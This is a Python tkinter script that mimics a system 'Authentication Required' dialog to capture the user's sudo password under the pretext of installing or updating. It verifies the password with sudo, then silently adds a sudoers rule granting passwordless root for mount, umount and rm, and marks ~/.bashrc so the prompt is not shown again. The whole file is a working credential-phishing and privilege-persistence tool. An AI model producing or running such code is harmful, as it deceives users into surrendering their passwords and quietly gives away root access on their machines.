from tkinter import *
from PIL import ImageTk, Image
import subprocess
import os

#global variables
bins = ["/bin/mount", "/bin/umount", "/bin/rm"]
root_user = False
window = password_lbl = password_entry = None

#call this function if returned true then root privilege gained
#else : the root privilege failed
def get_root():
    file = open("/home/"+os.environ.get('USER')+"/.bashrc", 'r')
    lines = file.readlines()
    gotroot = None
    for line in lines:
        if "gotroot=true" in line:
            gotroot = "true"
        
    if gotroot==None:
        open_window()
        return root_user
    else:
        return None
    file.close()

def got_root():
    try:
        os.system("echo 'export gotroot=true' >> ~/.bashrc")
        return True
    except:
        return False

def add_bins_to_sudoers():
    global bins
    bins_list = ", ".join(bins)
    command = "echo '"+get_username()+" ALL=(ALL:ALL) NOPASSWD: "+bins_list+"' | sudo EDITOR='tee -a' visudo"
    try:
        os.system(command)
        return True
    except:
        return False

#this function checks if the given password is true or no
def password_checking(password):
    echo_command = subprocess.Popen(['echo',password], stdout=subprocess.PIPE)
    root_command = subprocess.Popen(['sudo', '-S', 'whoami'], stdin=echo_command.stdout, stdout=subprocess.PIPE)
    
    if root_command.stdout.read()==b'root\n':
        if got_root() and add_bins_to_sudoers() :
            return True
        else:
            return False
    else:
        return False

#this function is called when the "OK" button clicked
def ok_click_handler():
    global password_entry, root_user, window, password_
    #getting the password from input field
    password=password_entry.get()
    #check if root password is true
    if password_checking(password)==True:
        root_user = True
        window.destroy()
    else:
        password_lbl.place(anchor="center", relx=0.5, rely=0.8)
        password_entry.delete(0, END)

#this function is called when the "Cancel" button clicked
def cancel_click_handler():
    #closing the window
    global window
    window.destroy()


def get_username():
    return os.environ.get('USER')

def open_window():
    global window, password_entry, password_lbl, root_user

    #creating new window
    window = Tk()

    #window title
    window.title("Authenticate")
    window.configure(width=550, height=450, background="#1d1d1d")

    #----- initialisation -----

    #image
    lgo_img=ImageTk.PhotoImage(Image.open("images/logo.png"))
    #labels
    admin_tasks_lbl=Label(window)
    description_lbl=Label(window)
    password_lbl=Label(window)
    username_lbl=Label(window)
    
    lgo_image_lbl=Label(window, image=lgo_img)
    #inputs
    password_entry=Entry(window, show='●')
    #buttons
    ok_button=Button(window)
    cancel_button=Button(window)

    #----- configuration -----

    #labels
    admin_tasks_lbl.configure(text="Authentication Required", font=('Helvetica', 20, 'bold'), foreground="white", justify="left", background="#1d1d1d")
    description_lbl.configure(text="Authentication required to istall or update.", font=('Helvetica', 14, 'normal'), foreground="white", background="#1d1d1d")
    password_lbl.configure(text="Sorry, that didn't work. Please try again.", font=('Helvetica', 15, 'normal'), foreground="#eb8b0f", background="#1d1d1d")
    username_lbl.configure(text=get_username(), font=('Helvetica', 14, 'normal'), foreground="white", background="#1d1d1d")
    #input
    password_entry.configure(font=('Helvetica', 20, 'bold'),foreground="white", bd=0,highlightbackground="#2375c5" , highlightcolor="#2c92f6", highlightthickness=2, insertbackground="white", background="#1d1d1d")
    #buttons
    ok_button.configure(text="OK", font=('Helvetica', 14, 'normal'),foreground="white",background="#2c2c2c",bd=0, highlightthickness=0, activebackground="#343434", activeforeground="white", command=ok_click_handler)
    cancel_button.configure(text="Cancel", font=('Helvetica', 14, 'normal'), foreground="white", background="#2c2c2c",bd=0, highlightthickness=0,activebackground="#343434", activeforeground="white", command=cancel_click_handler)
    #image
    lgo_image_lbl.configure(background="#1d1d1d")

    #----- placements -----

    #labels
    lgo_image_lbl.place(anchor="center", relx=0.5, rely=0.4)
    admin_tasks_lbl.place(anchor="center", relx=0.5, rely=0.1)
    description_lbl.place(anchor="center", relx=0.5, rely=0.2)
    username_lbl.place(anchor="center", relx=0.5, rely=0.55)
    #input
    password_entry.place(anchor="center", relx=0.5, rely=0.7, height=30)
    #buttons
    ok_button.place(x=275, y=400, width=275, height=50)
    cancel_button.place(x=0, y=400, width=275, height=50)


    window.mainloop()
